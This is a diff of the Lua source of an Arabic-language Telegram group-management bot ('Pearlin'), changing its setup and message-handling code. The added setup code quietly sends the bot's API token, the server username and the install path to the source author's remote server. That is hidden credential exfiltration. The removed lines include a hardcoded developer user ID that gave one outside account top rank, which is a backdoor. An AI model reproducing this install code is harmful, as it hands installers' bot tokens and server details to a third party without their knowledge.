@@ -1,15 +1,14 @@
 --[[
-#  ▄█    █▄     ▄████████    ▄████████    ▄████████  Channel : @UUIOO 
-#  ███    ███   ███    ███   ███    ███   ███    ███ 
-#  ███    ███   ███    █▀    ███    █▀    ███    ███ 
-#  ███    ███  ▄███▄▄▄      ▄███▄▄▄      ▄███▄▄▄▄██▀  Bot : @UUIOOBot
-#  ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
-#  ███    ███   ███    █▄    ███    █▄  ▀███████████ Dev : @RSAIED and @YYBYY
-#  ███    ███   ███    ███   ███    ███   ███    ███ 
-#   ▀██████▀    ██████████   ██████████   ███    ███  By Source Pearlin
-#                                        ███    ███ 
-------------------------------------------------------
-]]
+#    ▀█████████▄   ▄██████▄     ▄████████    ▄████████
+#      ███    ███ ███    ███   ███    ███   ███    ███
+#      ███    ███ ███    ███   ███    █▀    ███    █▀
+#     ▄███▄▄▄██▀  ███    ███   ███          ███
+#    ▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3Pearlin
+#      ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
+#      ███    ███ ███    ███    ▄█    ███    ▄█    ███
+#    ▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source TH3Pearlin BY @TH3BS
+#---------------------------------------------------------------------
+]] 
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_http  , http  = pcall(require, "socket.http")
 http.TIMEOUT = 5
@@ -28,10 +27,9 @@ end
 
 if not Er_utf8 then
 print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
-os.execute("sudo luarocks install luautf8")
 os.exit()
 end
-
+ 
 
 
 function create_config(Token)
@@ -53,45 +51,68 @@ BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
 io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
-io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
+
+io.write('\n\27[1;33m￤آدخل مـعرف آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERNAME SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
+print('\n\27[1;31m￤ You Did not Enter USERNAME !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن مـعرف آلمـطـور آلآسـآسـي')
 create_config(Token)
 end 
-if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
+if not SUDO_USER:match('@[%a%d_]') then
+print('\n\27[1;31m￤ This is Not USERNAME !\n￤هہ‏‏ذآ ليس مـعرف حسـآب تلگرآم , عذرآ آدخل آلمـعرف آلصـحيح آلآن . ')
 create_config(Token)
 end 
-print('('..SUDO_USER..')')
-local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
-GetUser = json:decode(url)
+local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+user = {}
+user.username = SUDO_USER
+user.Source  = DirFol
+local url , res = https.request('https://api.th3Pearlin.com/GetID/?Array='..JSON.encode(user))
+print('https://api.th3Pearlin.com/GetID/?Array='..JSON.encode(user))
 if res ~= 200 then
-end
-if GetUser.ok == false then
+print(res)
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+os.exit()
+end
+success, GetUser = pcall(JSON.decode, url)
+if not success then
+print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+os.exit()
+end
+if not GetUser.result then
+if GetUser.cause then
+print('\n\27[1;31m￤ '..GetUser.cause)
+os.exit()
+end
+print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلمـعرف , تآگد مـنهہ‏‏ جيدآ  !')
+create_config(Token)
+end 
+if GetUser.information.typeuser ~= "UserTypeGeneral" then
+print('\n\27[1;31m￤ This UserName is not personal account !\n￤عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
 create_config(Token)
 end
-GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
 Pearlin = Token:match("(%d+)")
-redis:set(Pearlin..":VERSION",1.00)
-redis:set(Pearlin..":SUDO_ID:",SUDO_USER)
-redis:set(Pearlin..":DataCenter:",'German')
-redis:set(Pearlin..":UserNameBot:",BOT_User)
-redis:set(Pearlin..":NameBot:",BOT_NAME)
-redis:hset(Pearlin..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-redis:set("TH3Pearlin_INSTALL","Yes")
-info = {}
-info.username = '@'..GetUser.result.username
+redis:mset(
+Pearlin..":VERSION",GetUser.information.Source_version,
+Pearlin..":SUDO_ID:",GetUser.information.id,
+Pearlin..":DataCenter:",GetUser.information.DataCenter,
+Pearlin..":UserNameBot:",BOT_User,
+Pearlin..":ApiSource",GetUser.information.WebSite,
+Pearlin..":NameBot:","الزعيم",
+"TH3Pearlin_INSTALL","Yes"
+)
+redis:hset(Pearlin..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+info = {} 
+info.username = '@'..GetUser.information.username
 info.userbot  = BOT_User
-info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close() 
+Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس امريكي \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
-https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -100,17 +121,24 @@ chmod +x ./run
 ]])
 end
 
-
-
-
-function Start_Bot()
+function Start_Bot() 
 local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
- 🇾🇪
-.      \  😻
-.مبروك تنصيب سـورس .                 \[💛]       .  
-.أفيـرا .                                            / \          .
+
+
+
+
+
+▀█████████▄   ▄██████▄     ▄████████    ▄████████
+  ███    ███ ███    ███   ███    ███   ███    ███
+  ███    ███ ███    ███   ███    █▀    ███    █▀
+ ▄███▄▄▄██▀  ███    ███   ███          ███
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3BS
+  ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
+  ███    ███ ███    ███    ▄█    ███    ▄█    ███
+▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source The3Pearlin
+---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
 else
@@ -124,7 +152,6 @@ ApiToken = "https://api.telegram.org/bot"..Token
 Bot_User = redis:get(Pearlin..":UserNameBot:")
 SUDO_ID = tonumber(redis:get(Pearlin..":SUDO_ID:"))
 if not SUDO_ID then io.popen("rm -fr ./inc/Token.txt") end
-SUDO_ID =  tonumber(redis:get(Pearlin..":SUDO_ID:"))
 SUDO_USER = redis:hgetall(Pearlin..'username:'..SUDO_ID).username
 version = redis:get(Pearlin..":VERSION")
 DataCenter = redis:get(Pearlin..":DataCenter:")
@@ -142,10 +169,22 @@ print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
-🇾🇪
-.      \  😻
-.مبروك تنصيب سـورس .                 \[💛]       .  
-.أفيـرا .                                            / \          .
+
+
+
+
+
+
+▀█████████▄   ▄██████▄     ▄████████    ▄████████ 
+  ███    ███ ███    ███   ███    ███   ███    ███ 
+  ███    ███ ███    ███   ███    █▀    ███    █▀  
+ ▄███▄▄▄██▀  ███    ███   ███          ███        
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3BS
+  ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
+  ███    ███ ███    ███    ▄█    ███    ▄█    ███ 
+▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ VERSION » v]]..version..[[
+
+-------------------------------------------------------------------
                                                   
 ]]..'\027[0;32m'
 ..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
@@ -224,11 +263,7 @@ end
 return false 
 end
 
-if msg.sender_user_id_ == 695169733 then 
-msg.TheRankCmd = 'المطـور السورس'
-msg.TheRank = 'مطور السـورس'
-msg.Rank = 1
-elseif msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور الاساسي' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -341,8 +376,8 @@ Del_msg(msg.chat_id_,msg.id_)
 return false 
 else
 if redis:get(Pearlin.."lock_check"..msg.chat_id_) then
-local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ايـراني }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
-local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ايـراني ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
+local text = "⚜️┇ اهلاً بك في المجموعة\n🛠┇ للتأكد بأنك لست { ربوت }\n⚠️┇ تم تقييدك اضغط الزر بالاسفل\n💡┇ للتأكد انك { عضو حقيقي }🌻👇🏾"
+local inline = {{{text="• أضـغط ۿـنا للتـأكد أنك لست ربوت ♻️",callback_data="CheckRobotJoin:"..Senderid}}}
 Restrict(msg.chat_id_,Senderid,1)
 return send_inline(msg.chat_id_,text,inline,msg.id_)
 end
@@ -361,22 +396,22 @@ end
 
 --[[ المكتومين ]]
 if msg.GroupActive and MuteUser(msg.chat_id_,msg.sender_user_id_) then 
-if msg.Admin then redis:srem(Pearlin..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.Special or msg.Admin then redis:srem(Pearlin..'is_silent_users:'..msg.chat_id_,msg.sender_user_id_) return false end
 print("\27[1;31m User is Silent\27[0m")
 Del_msg(msg.chat_id_,msg.id_)
 return false 
 end
 
 --[[ المحظورين ]]
-if msg.GroupActive and Check_Banned((msg.adduser or msg.sender_user_id_),msg.sender_user_id_) then
-if msg.Admin then redis:srem(Pearlin..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
+if msg.GroupActive and Check_Banned(msg.chat_id_,(msg.adduser or msg.sender_user_id_)) then
+if msg.Special then redis:srem(Pearlin..'banned:'..msg.chat_id_,msg.sender_user_id_) return end
 print('\27[1;31m is_BANED_USER\27[0m')
 Del_msg(msg.chat_id_, msg.id_)
 kick_user((msg.adduser or msg.sender_user_id_), msg.chat_id_)
 return false 
 end
 
-if msg.GroupActive and not msg.Special then
+if msg.GroupActive and not msg.Special and not msg.Admin then
 if redis:get(Pearlin..'mute_text'..msg.chat_id_) then --قفل الدردشه
 print("\27[1;31m Chat is Mute \27[0m")
 Del_msg(msg.chat_id_,msg.id_)
@@ -407,51 +442,39 @@ end
 
 if ScriptFile and ScriptFile.Pearlin then 
 if msg.text and ScriptFile.iPearlin then
-	XPearlin = ScriptFile.Pearlin
-	local list = redis:hgetall(Pearlin..":AwamerBotArray:"..msg.chat_id_)
-	for Pearlin2,k in pairs(list) do
-		Text = msg.text
-		Text2 = k
-		if Text:match(Pearlin2) then 
-		local AmrOld = redis:hgetall(Pearlin..":AwamerBotArray2:"..msg.chat_id_)
-		amrnew = "" amrold = ""
-		for Amor,ik in pairs(AmrOld) do
-		if Text2:match(ik) then			
-		amrnew = Amor ; amrold = ik  end
-		end
-		Text = Text:gsub(amrnew,amrold)
-		AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-		GetMsg = ScriptFile.iPearlin(msg,{Text:match(Text2)})
-		if GetMsg then
-		print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
-		sendMsg(msg.chat_id_,msg.id_,GetMsg)
-		return false
-		end 
-		end
-	end
+XPearlin = ScriptFile.Pearlin
+local list = redis:hgetall(Pearlin..":AwamerBotArray:"..msg.chat_id_)
+for Pearlin2,k in pairs(list) do
+Text = msg.text
+Text2 = k
+if Text:match(Pearlin2) then 
+local amrr = {Text:match(Pearlin2)}
+local AmrOld = redis:hgetall(Pearlin..":AwamerBotArray2:"..msg.chat_id_)
+amrnew = "" amrold = ""
+for Amor,ik in pairs(AmrOld) do
+if Text2:match(ik) then	
+if amrr[1] == Amor then
+amrnew = Amor ; amrold = ik   
+end end end
+Text = Text:gsub(amrnew,amrold)
+AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
+GetMsg = ScriptFile.iPearlin(msg,{Text:match(Text2)})
+if GetMsg then
+print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
+sendMsg(msg.chat_id_,msg.id_,GetMsg)
+return false
+end 
+end
+end
 
 for k, Pearlin in pairs(XPearlin) do
 Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-
 if Text:match(Pearlin) then -- Check Commands To admin
-if not CheckFlood(msg.sender_user_id_,msg.chat_id_,3) and not msg.SudoUser then
-print("user is flood")
-redis:setex(Pearlin..'sender:'..msg.sender_user_id_..':'..msg.chat_id_..'flood',10,true)
-kick_user(msg.sender_user_id_,msg.chat_id_,function(arg,data)
-if data.ID == "Error" then
-StatusLeft(arg.chat_id_,our_id)
-local NameGroup = Flter_Markdown(redis:get(Pearlin..'group:name'..arg.chat_id_) or "")
-sendMsg(arg.chat_id_,1,'📛*¦* تم مغادره وتعطيل البوت \n🎟*¦* بسبب التكرار وليس لدي صلاحيه لطرد الشخص المخالف\n ❕')    
-sendMsg(SUDO_ID,1,'📛*¦* تم مغادره وتعطيل البوت \n🎟*¦* بسبب التكرار \n\n|id : `'..arg.chat_id_..'`\n|Name : '..NameGroup..'\n ❕')    
-rem_data_group(arg.chat_id_)
-end
-end,{chat_id_=msg.chat_id_,sender_user_id_=msg.sender_user_id_})
-return false 
-end
-local GetMsg = ScriptFile.iPearlin(msg,{Text:match(Pearlin)})
+AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
+GetMsg = ScriptFile.iPearlin(msg,{Text:match(Pearlin)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : ",Pearlin.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -461,43 +484,15 @@ end
 end
 end  --- End iPearlin
 if ScriptFile.dPearlin then
-if not msg.forward_info_ and msg.content_.ID ~= "MessagePhoto" and not CheckFlood(msg.sender_user_id_,msg.chat_id_,15) and not msg.SudoUser then
-print("user is flood For Msg And i Del All Count His Msgs")
-GetChatMember(msg.chat_id_,our_id,function(arg,data)
-if not data.status_ then return false end
-GetUserID(arg.sender_user_id_,function(arg,data)
-if data.username_ then USERNAME = '@'..data.username_ else USERNAME = FlterName(data) end
-USERCAR = utf8.len(USERNAME)
-if arg.Status == "ChatMemberStatusEditor" then 
-Restrict(arg.chat_id_,data.id_,300)
-MsgFlood = "👤¦ العضو » "..USERNAME.." \n📇¦ تم تقييدك لمدة 5 دقائق \n📛¦ تم تصفـيـر احصائيات رسائلك \n🚸¦ بسبب تكرارك لاكثر من 15 رسالة ...  \n"
-else
-redis:setex(Pearlin..'sender:'..data.id_..':'..arg.chat_id_..'flood',300,true)
-MsgFlood = "👤¦ العضو » "..USERNAME.." \n📇¦ ولانك ادمن تم كتمك لمده 5 دقائق \n📛¦ تم تصفـيـر احصائيات رسائلك \n🚸¦ بسبب تكرارك لاكثر من 15 رسالة ...  \n"
+if ScriptFile.dPearlin(msg) == false then
+return false
 end
-SendMention(arg.chat_id_,data.id_,arg.id_,'👤¦ العضو » '..USERNAME..' \n🎫¦ الايدي » {'..data.id_..'}\n🛠¦ تم الغاء حظره \n✓️',12,USERCAR) 
-end,{chat_id_=arg.chat_id_,id_=arg.id_,Status= data.status_.ID})
-end,{chat_id_=msg.chat_id_,sender_user_id_=msg.sender_user_id_,id_=msg.id_})
-
-redis:del(Pearlin..'msgs:'..msg.sender_user_id_..':'..msg.chat_id_,
-Pearlin..':adduser:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':photo:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':sticker:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':voice:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':audio:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':animation:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':edited:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':video:'..msg.chat_id_..':'..msg.sender_user_id_,
-Pearlin..':Flood_Spam:'..msg.sender_user_id_..':'..msg.chat_id_..':msgs')
-return false 
-end
-if not ScriptFile.dPearlin(msg) then
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
-end
+
 for name,Plug in pairs(File) do
 if Plug.Pearlin then 
-if msg.text and not msg.forward_info_ and Plug.iPearlin then
+if msg.text and Plug.iPearlin then
 for k, Pearlin in pairs(Plug.Pearlin) do
 if msg.text:match(Pearlin) then
 local GetMsg = Plug.iPearlin(msg,{msg.text:match(Pearlin)})
@@ -521,10 +516,6 @@ end
 else
 print("The File Script.lua Not Runing in The Source Pearlin")
 end
-
-
-
-
 end
 
 function tdcli_update_callback(data)
@@ -560,8 +551,8 @@ elseif UserID == UserJoin then
 end	
 if Adminn then
 Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست ايـراني ❤️",true)
-EditMsg(ChatID,dataid,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست ايـراني ❤️")
+answerCallbackQuery(data.id_,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️",true)
+EditMsg(ChatID,dataid,"👍🏻|تم فك التقييد بنجاح والتأكد بانك لست روبوت ❤️")
 else
 answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
 end
@@ -569,7 +560,8 @@ end
 else
 --	answerCallbackQuery(data.id_,"امر غير معرف",true)
 end
-	
+
+
 elseif data.ID == "UpdateMessageSendSucceeded" then
 local msg = data.message_
 if msg.content_.text_ then
